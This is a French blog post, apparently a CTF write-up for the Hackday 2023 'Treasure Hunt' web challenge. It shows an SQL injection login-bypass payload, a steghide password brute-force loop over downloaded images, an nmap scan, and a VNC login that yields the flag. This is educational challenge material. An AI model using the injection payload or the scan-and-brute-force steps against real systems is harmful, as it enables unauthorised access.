---
layout: post
title: Hackday_2023 - A Treasure Hunt
date: 2023-03-21 21:15 +0100
categories: web
difficulty: easy
---

### treasure hunter

J'effectue en premier 

test d'injection sur le formulaire avec la payload
```bash
' OR 1=1 -- -
```
Je suis redirigé vers une page slider.php qui contient des images qui défilent. 
Je télécharge l'ensemble des images avec un oneliner
```bash
for ((i=1 ; i < 11; i++)); do wget https://7c21111516t.hackday.fr/images/slides/00$i.jpg done

for ((i=11 ; i < 31; i++)); do wget https://7c21111516t.hackday.fr/images/slides/0$i.jpg done
```
après avoir fouillé robot.txt sur le site, je download la liste de password qui se cache sur le site : 
```bash
wget https://7c21111516t.hackday.fr/passwordSuggestionList.txt 
```
Avec cette liste je bruteforce les fichiers jpg avec steghide. 
```bash
for file in ~/ctf/*.jpg ; do steghide extract -sf $file -p family done
```
J'extrais un fichier.txt qui contient le message suivant :
```text
Hi swashbuckler, congratulations for coming this far ! 
You can have access to all my wealth in my bank account if you get connected 
to the server. The password is the first 8 letters of the 
name of the historical site where we buried the treasure.
Here are the GPS coordinates of the site.
- - - - - - - - - - - - - - - - - - -
-40.33892996,176.58696554       |
- - - - - - - - - - - - - - - - - - -
```

Avec les coordonnées GPS on tombe sur la place avec le nom le plus long au monde. Je récupère les 8 premiers caractères du nom et me retrouve avec *taumataw*.<br>

Je continue ma fouille sur le site et fais un nmap :

```bash
 ─$ nmap -T4 -sV 7c21111516t.hackday.fr
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-18 08:08 EDT
Nmap scan report for 7c21111516t.hackday.fr (193.70.90.113)
Host is up (0.030s latency).
rDNS record for 193.70.90.113: vps-130fe7f4.vps.ovh.net
Not shown: 996 filtered tcp ports (no-response)
PORT      STATE SERVICE  VERSION
80/tcp    open  ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
443/tcp   open  ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
5901/tcp  open  vnc      VNC (protocol 3.8)
12345/tcp open  netbus?
nmap -T4 -sV 7c21111516t.hackday.fr
```
Je découvre alors le port VNC ouvert et me connecte 
```
vncviewer 7c21111516t.hackday.fr::5901
```
Le mdp Taumataw me permet de me connecter à une machine distante et d'y trouver le flag.

<img src="/src/img/vnc_flag.png">



